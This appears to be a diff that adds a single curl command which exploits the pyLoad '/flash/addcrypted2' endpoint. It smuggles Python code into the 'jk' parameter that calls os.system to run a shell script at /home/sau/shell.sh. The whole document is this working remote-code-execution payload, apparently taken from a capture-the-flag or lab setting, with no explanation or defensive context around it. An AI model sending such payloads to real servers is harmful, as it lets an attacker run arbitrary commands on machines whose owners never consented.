@@ -1,0 +1,5 @@
+curl -i -s -k -X $'POST' \
+--data-binary
+$'jk=pyimport%20os;os.system(\"python3%20/home/sau/shell.sh\");f=function%20f2()
+{};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+$'http://localhost:8000/flash/addcrypted2'
